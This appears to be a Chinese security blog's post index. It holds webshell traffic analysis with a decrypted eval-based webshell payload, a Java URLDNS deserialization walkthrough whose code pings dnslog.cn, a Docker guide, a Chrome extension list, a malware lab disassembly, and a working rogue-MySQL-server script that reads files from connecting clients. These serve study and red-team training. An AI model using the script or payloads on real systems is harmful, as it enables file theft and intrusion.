6l0hF7vDByXs+2zE63uNlwhgrIDJgbiGOX3Ds6FaIiuCcQ/ZUtqA9W8sAQCdge6P+zJ1OoKVkNCpOhUb3e22MUXxtWH+1BdoR+S5aSN6NjcM4pKQrwXJ4xyV59kI9PUAjavw7DK+/Pf2wUFWCT2YVbObz+NLTxQ2r8QswTWp0kVLMSNIzOwbtWjUy+S9UAAPIVHPKmXRzplprChlH0wL9uCUO8L2htsaRM0Fpd7M8vrDyQ== 解密后 1234567891011121314151617181920212223242526272829303132assert|eval(base64_decode(&#x27;@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&#x27;k&#x27;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;S3F0TTlUQjVsSkRGNnFlSHU2dEt0c0RzdzZlUWpWaUJobzRCMW9id0NlSzd2SzlEWFBaMENsSXpJVXh5aTFwMWxNa3VSd1k5YVJUQWZnNWkzS0JPQ3hsbWRpdGpHZkQ4dnlsMk9SenZ1T3hxZE5FOEVGaEs1TXF0S1hHcFZxSVIyeWJTY25weHZDWW93SnZ0&quot;;$content=base64_decode($content);main($content);// 解密第一次发送的数据查看，这里有一个参数为 $content 这个变量名称和里面的内容为随机生成的， 目的是为了绕过 $Content-Length ，这个已经在冰蝎2.0中已经被加入了Waf的检测规则当中，所以在冰蝎3.0当中用数据填充的方式绕过。&#x27;));\u0001 1234567891011121314HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:47:16 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=j39c0oi2abaghm0b8h5ab7pmj3; path=/Keep-Alive: timeout=5, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j42REBdjeI0ap/e4pavYx6svt2i0v0ZERdkwhGaPZ/VBGvP1Cw29Ic+DnwBtTxWec7IuOA8jFdHrujhbw+4sln0433D5aFZLZUmEL6LuWpl2caVaTnmhPj7pWvWPGafD8CsHA1kTk/zy6s6ik5IMIWJkDVTI3vlb4zy2y5Qomp0RDOjsYaeRkwQerekW7A0sZcCm4suP8/BO3J/W6pOaBUhYUKjVIB/zsvKBsBgz1pMpUMBLFSU8B1RApobdh5rzEsKseQXvj4HKy+3HwF72AKQ 哥斯拉后门程序总结AntSword： requests response base64等方式 明文 冰蝎2.0： requests response 开启Openssl扩展-动态密钥aes加密 aes加密+base64 未开启Openssl扩展-异或 异或+base64 冰蝎3.0： requests response 开启Openssl扩展-静态密钥aes加密 aes加密+base64 未开启Openssl扩展-异或 异或+base64 哥斯拉： requests response php的为base64+异或+base64 异或+base64+脏字符 jsp的为Base64+AES aes+base64+脏字符 参考文章","categories":[{"name":"红蓝攻防","slug":"红蓝攻防","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"},{"name":"web安全","slug":"红蓝攻防/web安全","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"攻防","slug":"攻防","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Arm U Chrome","slug":"arm u chrome","date":"2022-09-01T13:16:50.000Z","updated":"2022-09-01T07:18:17.993Z","comments":true,"path":"2022/09/01/arm u chrome/","link":"","permalink":"http://example.com/2022/09/01/arm%20u%20chrome/","excerpt":"","text":"Arm U Chrome本文整理了个人学习过程中发现的一些有用的chrome插件。 chrome应用商店 https://chrome.google.com/webstore/category/extensions，需~~科学上网~~ Tampermonkey【油猴】被各种教育网课折磨的大学生应该都知道这个插件吧。 可在插件商店安装各类插件，以及可自定义编写脚本。刷个课简直不要太爽。 还有多种实用功能等待探索 google translate【谷歌翻译】阅读英文资料不认识单词怎么办，这款插件可实时对所选内容进行翻译，且界面简介。笔者对多款翻译插件使用过后，发现不是反应速度慢（如有道词典字典的取词翻译），要么就是翻译界面臃肿。 Listen1【网页听歌】在屋顶唱着你的歌 安装Listen1插件，就能收听多个音乐平台的免费音乐。同时，你还可以搜索多个平台的音乐和歌单，并且创造属于你自己的歌单内容。 Copyfish 🐟 Free OCR Software【截屏取词插件】网页文字不让复制怎么办？ 代码为图片形式不能粘贴怎么办？ 这款插件能够对所截取的内容进行高效的文本识别，妈妈再也不用担心复制不了代码啦（事实识别能力证明还是不太行，凑活用吧） OneTab【一键整理标签页，神器墙推】写代码遇到莫名其妙的错误，查阅文档互相引用，复现漏洞时看各种文章。 相信每个coder都有这样的经历，浏览器开了一堆tab标签乱如麻却不知所措，此插件可以一键整理tab标签，并且可保存方便下次直接打开。 Quick QR【二维码生成器】电脑看到了一段情话想分享给女神怎么办，文件传输助手？太low了。这款插件能够将你所输入的文本内容转化为QR code，只需手机一扫即可复制粘贴。再也不怕女神骂你直男啦 猫抓【自动嗅探资源+媒体控诉】打开一个页面，乱七八糟的资源让你无处下手。这款插件能够自动嗅探当前页面可下载的资源。且可对视频进行倍速调整，可自己设置快捷键。恰饭时看视频，刷网课16倍速再也不是梦。 FeHelper【前端助手】集成了各种在线小工具，再也不用找各种在线网站了 Enhanced GitHub【加强的github】github看到个好东西，什么，竟然只能整个仓库一起clone，好麻烦。这款插件可以对单个文件进行下载。 ublocked origin【网络请求过滤工具】一款高效的网络请求过滤工具，占用极低的内存和 CPU。一款高效的请求过滤工具：占用极低的内存和CPU，和其他常见的过滤工具相比，它能够加载并执行上千条过滤规则。注意不是广告过滤 markdown here【markdown email】写邮件还用手动排版？ 用Markdown写一封漂亮的电子邮件。Markdown Here允许你在发送电子邮件之前用Markdown语法编辑并转换它(让它看起来漂亮极了!)。 Speedtest by Ookla【网页、网络测速】网页打开慢？快测一测你的网速是拖拉机还是飞机 类似的网站【发现类似网站】快速探测和本网站相似的网站，实现资源横向。（不要去porxhub哦） 拿gayhub举例，能够探测到相同类型的网站 京东报价助手【实时监测价格】怕被强子薅羊毛？不可能的，此款插件可实时监控京东价格，且可自动申请价保服务。省了一块就是赚了一块。 Wappalyzer - Technology profiler【探测网页框架】可自动探测网页框架构成。渗透测试时也许有用 WhatRuns【同上】同上，但还是需要自己点一下才可以。 YouTube™ 双字幕【双语字幕，字幕下载，字幕配音】英语看不懂怎么办？不看了，youtube自带字幕只可实现英文&#x2F;中文,此插件可实现双字幕，看片的时候学学英语也不是不可以。 Sourcegraph【github搜索神器】可实现关键字搜索，生成代码结构图。更多功能正在探索。 GitHub-Web-IDE【web端vscode】如何优雅的查看github仓库 扩展管理器【管理插件】安装上述插件后，你的固定栏是不是这样 这款插件可收起固定栏。优雅。 更多内容等待探索","categories":[{"name":"黑科技","slug":"黑科技","permalink":"http://example.com/categories/%E9%BB%91%E7%A7%91%E6%8A%80/"}],"tags":[{"name":"黑科技","slug":"黑科技","permalink":"http://example.com/tags/%E9%BB%91%E7%A7%91%E6%8A%80/"}]},{"title":"URLDNS链","slug":"urldns","date":"2022-08-11T13:16:50.000Z","updated":"2022-09-01T01:28:22.122Z","comments":true,"path":"2022/08/11/urldns/","link":"","permalink":"http://example.com/2022/08/11/urldns/","excerpt":"","text":"URLDNS链 概述 URLDNS 就是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作“利用链”。因为其参数不不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求。 虽然这个“利用链”实际上是不能“利用”的，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用： 使用Java内置的类构造，对第三方库没有依赖 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 利用链 12345* Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() HashMap底层原理 HashMap是Map的一个实现类，以数组+(链表或红黑树)实现。它是以键值对存储数据的，Key-Value都是Map.Entry中的属性 在实例化以后，底层创建了长度是16的一维数组Entry[] table,其中每个节点用Node表示 123456Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; 当put一个键值对时，首先对key进行hash，其中hash中又调用hashcode方法，之后添加tab数组中添加node,源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true); &#125; static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; else if (p instanceof TreeNode) e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else &#123; for (int binCount = 0; ; ++binCount) &#123; if ((e = p.next) == null) &#123; p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null; &#125; 原理利用 java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，关键代码如下 123456789101112131415161718192021222324252627282930313233343536373839private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125;static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125;protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); //解析域名，发出DNS请求 return h; 因此利用链就很显而易见了 代码 123HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://pxqb7n.dnslog.cn&quot;); hashMap.put(url,123); 可以看到收到DNS请求，下面将hashMap序列化。 1234567891011121314//由于new URL()中的hashCode=-1，因此反序列化时，不能进入DNS解析，因此需反射设置hashCode！=-1HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://6g01re.dnslog.cn&quot;); Class urlClass = URL.class; Field fieldHashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); fieldHashCode.setAccessible(true); fieldHashCode.set(url,123456); hashMap.put(url,123); fieldHashCode.set(url,-1); serialize(hashMap); //unSerialize(&quot;ser.bin&quot;); 可以看到put时为收到DNS请求 反序列化时收到请求 总代码如下 12345678910111213141516171819202122232425262728293031323334353637package urldns;import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class urldns &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123; HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://dr8bqb.dnslog.cn&quot;); Class urlClass = URL.class; Field hashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,123); hashMap.put(url,112233); hashCode.set(url,-1); serialize(hashMap); unSerialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); ooStream.writeObject(obj); &#125; public static Object unSerialize(String fileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream oiStrean = new ObjectInputStream(new FileInputStream(fileName)); Object obj = oiStrean.readObject(); return obj; &#125;&#125;","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"docker使用","slug":"docker使用","date":"2022-08-09T13:16:50.000Z","updated":"2022-09-01T07:33:10.516Z","comments":true,"path":"2022/08/09/docker使用/","link":"","permalink":"http://example.com/2022/08/09/docker%E4%BD%BF%E7%94%A8/","excerpt":"","text":"概述 Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 docker优点 相比配置各种复杂环境，docker将应用程序和环境配置分开。因此可以快速部署，测试代码，大大减少编写代码和在生产环境中运行代码之间的延迟。 docker架构docker包括三个基本概念 镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。 容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。 概念 说明 Docker 镜像(Images) Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。 Docker 容器(Container) 容器是独立运行的一个或一组应用，是镜像运行时的实体。 Docker 客户端(Client) Docker 客户端通过命令行或者其他工具使用 Docker SDK (https://docs.docker.com/develop/sdk/) 与 Docker 的守护进程通信。 Docker 主机(Host) 一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。 Docker Registry Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(https://hub.docker.com) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。 Docker Machine Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。 docker安装 首先，更新软件包索引，并且安装必要的依赖软件，来添加一个新的 HTTPS 软件源： 12sudo apt updatesudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common 使用下面的 curl 导入源仓库的 GPG key： 1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 将 Docker APT 软件源添加到你的系统： 1sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; 想要安装 Docker 最新版本，运行下面的命令。 12sudo apt updatesudo apt install docker-ce docker-ce-cli containerd.io docker配置国内镜像源 阿里云申请镜像地址https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors touch &#x2F;etc&#x2F;docker&#x2F;daemon.json vim &#x2F;etc&#x2F;docker&#x2F;daemon.json,添加以下内容 123&#123; &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]&#125; systemctl reload docker systemctl restart dockerservice docker基本操作 帮助命令 12345678#显示docker的版本信息docker version #显示docker的系统信息，包括镜像和容器数量 docker info #显示命令帮助信息 docker 命令 --help 镜像命令 1234567891011#查看所有本地的主机上的镜像docker images #在docker hub上搜索指定镜像，默认tag为latest docker search &lt;image&gt;:&lt;tag&gt; #下载指定镜像docker pull &lt;image&gt;:&lt;tag&gt; #删除指定镜像docker rmi -f &lt;image ID&gt; 容器命令 使用容器命令之前，必须要有相应的镜像 新建容器 1234567891011#新建容器并使用docker run [可选参数] &lt;image&gt; --name=&quot;Name&quot; 容器名字，用于区分容器 -d 后台方式运行 -it 使用交互式方式运行，进入容器查看内容 -p 指定容器映射端口 -p 8080:8080 -p ip:主机端口:容器端口 -p 主机端口:容器端口 -p 容器端口 -P 随机指定端口 -e 修改配置文件 查看容器 12345#查看正在运行的容器docker ps #查看所有容器docker ps -a 退出容器 12345#退出并停止交互容器exit或Ctrl+P #退出但不停止容器Ctrl+P+Q 删除容器 12345#删除容器（不能删除正在运行的容器，若强制删除则需加上-f参数）docker rm #强制删除所有容器docker rm -f $(docker ps -aq) 启动和停止容器 1234567891011#启动容器docker start id #重启容器docker restart id #停止容器docker stop id #强制停止docker kill id 其他命令 后台启动容器 1docker run -d ubuntu 查看日志 1docker logs -tf --tail &lt;num&gt; &lt;id&gt; 查看容器进程信息 1docker top id 进入当前正在运行容器 1234567通常容器是在后台运行，但有时需要进入容器修改配置#方式一，进入容器开启新的终端docker exec -it id bash#方式二，进入容器正在执行的终端docker attach id bash 查看CUP状态 1docker stats id 举例 部署Nginx 123456789101112131415161718192021 #搜索镜像 docker search nginx #拉取镜像 docker pull nginx #查看镜像 docker images root@ubuntu:/home/xiaoh# docker images REPOSITORY TAG IMAGE ID CREATED SIZE nginx latest 605c77e624dd 2 weeks ago 141MB #后台启动镜像 docker run -d --name nginx01 -p 1234:80 nginx #测试是否启动 curl 127.0.0.1:1234 &lt;h1&gt;Welcome to nginx!&lt;/h1&gt;- 部署Tomcat #拉取镜像docker pull tomcat #后台启动镜像docker run -d -p 3456:8080 –name tomcat01 nginx #进入容器docker exec -it tomcat01 &#x2F;bin&#x2F;bash #发现缺少linux命令、缺少webapps。原因是阿里云默认下载最小镜像，所有其他不必要的资源都会被剔除，只保证最小可运行的环境。 #复制webappscp -r webapps.dist&#x2F;* webapps&#96;&#96;&#96;","categories":[{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"Mysql蜜罐反制","slug":"mysql蜜罐反制","date":"2022-08-09T13:16:50.000Z","updated":"2022-09-01T02:40:48.050Z","comments":true,"path":"2022/08/09/mysql蜜罐反制/","link":"","permalink":"http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/","excerpt":"","text":"Mysql登录分析 命令行登录Mysql，并抓包，可以看到 首先对Mysql版本进行验证 接着Request login，传输用户名和密码hash 登录成功，返回OK 查询版本号并返回 当执行一条语句时，抓包如下，可以看到查询语句明文传输 Navicat登录分析 登录流程和命令行登录差不多，多了几次Query 流程如下 Mysql特性 Mysql 默认打开local_infile，如为打开可执行下列命令 show global variables like&#39;local_infile&#39;; set global local_infile=1; 12345672. MySQL服务端可以利用`LOAD DATA LOCAL`命令来读取`MYSQL`客户端的任意文件，然后伪造恶意服务器向连接到这个服务器的客户端发送读取文件的`payload`。3. 本地执行命令 ```mysql load data local infile &#x27;C:/Users/royal/Desktop/pass/passwd.txt&#x27; into table test.test1 fields terminated by &#x27;\\n&#x27;; ![image-20220830105153036](https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105153036.png) 可以看到成功读取数据并写入表中 命令分析 抓包 执行query查询，重点看下返回包 接着读取文件内容并写入 反制 反制流程也很明了了，就是socket编程模拟navicat登录，然后服务端(蜜罐)发送load local file payload即可 脚本如下 12345678910111213141516171819202122232425262728293031323334353637# 模拟Mysql登录import socketserversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 3306serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)serversocket.bind((&quot;&quot;, port))serversocket.listen(5)while True: # 建立客户端连接 clientsocket,addr = serversocket.accept() print(&quot;连接地址: %s&quot; % str(addr)) # 返回版本信息 version_text = b&quot;\\x4a\\x00\\x00\\x00\\x0a\\x38\\x2e\\x30\\x2e\\x31\\x32\\x00\\x08\\x00\\x00\\x00\\x2a\\x51\\x47\\x38\\x48\\x17\\x12\\x21\\x00\\xff\\xff\\xc0\\x02\\x00\\xff\\xc3\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7a\\x6f\\x6e\\x25\\x61\\x3e\\x48\\x31\\x25\\x43\\x2b\\x61\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot; clientsocket.sendall(version_text) try: # 客户端请求信息 clientsocket.recv(9999) except Exception as e: print(e) # Response OK verification = b&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot; clientsocket.sendall(verification) try: # SET NAMES utf8mb4 clientsocket.recv(9999) except Exception as e: print(e) # Response TABULAR evil_response = b&quot;\\x09\\x00\\x00\\x01\\xfb\\x43\\x3a\\x2f\\x31\\x2e\\x74\\x78\\x74&quot; clientsocket.sendall(evil_response) # file_text print(clientsocket.recv(9999)) clientsocket.close() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 反制脚本 读取C:\\\\Windows\\\\PFRO.log文件# coding=utf-8import socketimport osserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 3306server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server.bind((&quot;&quot;, port))server.listen(5)def get_data(filename, client, addr): base_path = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + addr[0] if not os.path.exists(base_path): os.makedirs(base_path) evil_response = str.encode(chr(len(filename)+1)) + b&quot;\\x00\\x00\\x01\\xfb&quot; + str.encode(filename) # 恶意响应包 client.sendall(evil_response) file_data = client.recv(999999) print(file_data) with open(base_path + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;&quot;), &quot;wb+&quot;) as f: f.write(file_data) f.close()while True: # 建立客户端连接 client, addr = server.accept() print(&quot;连接地址: %s&quot; % str(addr)) # 返回版本信息 version_text = b&quot;\\x4a\\x00\\x00\\x00\\x0a\\x38\\x2e\\x30\\x2e\\x31\\x32\\x00\\x08\\x00\\x00\\x00\\x2a\\x51\\x47\\x38\\x48\\x17\\x12\\x21\\x00\\xff\\xff\\xc0\\x02\\x00\\xff\\xc3\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7a\\x6f\\x6e\\x25\\x61\\x3e\\x48\\x31\\x25\\x43\\x2b\\x61\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot; client.sendall(version_text) try: # 客户端请求信息 client.recv(9999) except Exception as e: print(e) # Response OK verification = b&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot; client.sendall(verification) try: # SET NAMES utf8mb4 client.recv(9999) except Exception as e: print(e) # Response TABULAR filename = &quot;C:\\\\Windows\\\\PFRO.log&quot; #这里为要读取的文件路径 get_data(filename, client, addr) client.close()","categories":[{"name":"红蓝攻防","slug":"红蓝攻防","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"攻防","slug":"攻防","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"}]},{"title":"恶意代码分析lab9-1","slug":"lab9-1","date":"2022-08-06T13:16:50.000Z","updated":"2022-09-01T00:52:23.531Z","comments":true,"path":"2022/08/06/lab9-1/","link":"","permalink":"http://example.com/2022/08/06/lab9-1/","excerpt":"","text":"纵观详细分析 打开程序观察堆栈发现并不是main函数入口点 利用ida分析main函数地址，并在od中断点 一步一步跟进调试 查看参数个数是否为1，继续向下直接call 401000 代码太长不好截图，直接放代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283.text:00402410 push ebp.text:00402411 mov ebp, esp.text:00402413 sub esp, 208h.text:00402419 push ebx.text:0040241A push esi.text:0040241B push edi.text:0040241C push 104h ; nSize.text:00402421 lea eax, [ebp+Filename].text:00402427 push eax ; lpFilename.text:00402428 push 0 ; hModule.text:0040242A call ds:GetModuleFileNameA.text:00402430 push 104h ; cchBuffer.text:00402435 lea ecx, [ebp+Filename].text:0040243B push ecx ; lpszShortPath.text:0040243C lea edx, [ebp+Filename].text:00402442 push edx ; lpszLongPath.text:00402443 call ds:GetShortPathNameA.text:00402449 mov edi, offset aCDel ; &quot;/c del &quot;.text:0040244E lea edx, [ebp+Parameters].text:00402454 or ecx, 0FFFFFFFFh.text:00402457 xor eax, eax.text:00402459 repne scasb.text:0040245B not ecx.text:0040245D sub edi, ecx.text:0040245F mov esi, edi.text:00402461 mov eax, ecx.text:00402463 mov edi, edx.text:00402465 shr ecx, 2.text:00402468 rep movsd.text:0040246A mov ecx, eax.text:0040246C and ecx, 3.text:0040246F rep movsb.text:00402471 lea edi, [ebp+Filename].text:00402477 lea edx, [ebp+Parameters].text:0040247D or ecx, 0FFFFFFFFh.text:00402480 xor eax, eax.text:00402482 repne scasb.text:00402484 not ecx.text:00402486 sub edi, ecx.text:00402488 mov esi, edi.text:0040248A mov ebx, ecx.text:0040248C mov edi, edx.text:0040248E or ecx, 0FFFFFFFFh.text:00402491 xor eax, eax.text:00402493 repne scasb.text:00402495 add edi, 0FFFFFFFFh.text:00402498 mov ecx, ebx.text:0040249A shr ecx, 2.text:0040249D rep movsd.text:0040249F mov ecx, ebx.text:004024A1 and ecx, 3.text:004024A4 rep movsb.text:004024A6 mov edi, offset aNul ; &quot; &gt;&gt; NUL&quot;.text:004024AB lea edx, [ebp+Parameters].text:004024B1 or ecx, 0FFFFFFFFh.text:004024B4 xor eax, eax.text:004024B6 repne scasb.text:004024B8 not ecx.text:004024BA sub edi, ecx.text:004024BC mov esi, edi.text:004024BE mov ebx, ecx.text:004024C0 mov edi, edx.text:004024C2 or ecx, 0FFFFFFFFh.text:004024C5 xor eax, eax.text:004024C7 repne scasb.text:004024C9 add edi, 0FFFFFFFFh.text:004024CC mov ecx, ebx.text:004024CE shr ecx, 2.text:004024D1 rep movsd.text:004024D3 mov ecx, ebx.text:004024D5 and ecx, 3.text:004024D8 rep movsb.text:004024DA push 0 ; nShowCmd.text:004024DC push 0 ; lpDirectory.text:004024DE lea eax, [ebp+Parameters].text:004024E4 push eax ; lpParameters.text:004024E5 push offset File ; &quot;cmd.exe&quot;.text:004024EA push 0 ; lpOperation.text:004024EC push 0 ; hwnd.text:004024EE call ds:ShellExecuteA.text:004024F4 push 0 ; int.text:004024F6 call _exit.text:004024F6 sub_402410 endp 大体就是得到本地文件路径，拼凑字符串在本地尝试可以看到此命令为删除指定路径的文件(怪不得每次点击exe文件就没了，还以为防火墙删了emm)调用SHELL32的ShellExecute函数执行拼接的字符串，但由于已在od中打开，所以不会删除接着往下看，传入参数-in后call 40380f 在main函数中找到__mbscmp相关调用（call的40380f），此函数是比较字符串是否相等的 此函数（40380f）的返回值为910000 可以看到参数-c -cc -re- in 参数 地址 功能 -in .text:00402600 -c -cc .text:0x401280 -re 接着往下看，添加-in参数后Ctrl+F2重新调试 可见跳过删除自身，push参数call 402510 分析402510函数，发现对传入参数进行是否为abcd的校验 校验失败，call 402410函数，就是之前删除自身的函数 改变参数为-in abcd，即可跳过 call 0040380，ida分析为_mbscmp函数 call 4025B0 该函数作用为获取文件名且返回result&#x3D;0 接着往下走，call 402600 应该是最重要的对应参数函数 可以看到所传参数为4025B0的返回值（即当前文件文件名） 跟进后看到call了_alloca_probe（可能与注册内存有关，先不管）和4025b0（先前分析过为截取文件名） 接着跟进发现跳转到402632，发现此函数前部分是实现拼接字符串%SYSTEMROOT%\\system32\\Lab09-01.exe的操作，然后调用OpenScManagerA 可以OpenScManagerA传入参数为3个立即数，之前分析知道它返回一个服务控制管理器句柄，所有要和服务交互的代码会调用这个函数； 对于这种官方API函数可以跳过 接着调用OpenService函数，参数为自身文件名，可以判断开启一个自身服务 接着调用ChangeServiceConfigA和CloseService函数 其中ChangeServiceConfigA所传参数如下，hService为之前开启的自身服务 再往下发现就跳出了402600函数，因此可以推断-in参数为创建服务功能，ida F5伪代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172int __cdecl sub_402600(LPCSTR lpServiceName)&#123; int result; // eax@2 SC_HANDLE hService; // [sp+Ch] [bp-1408h]@5 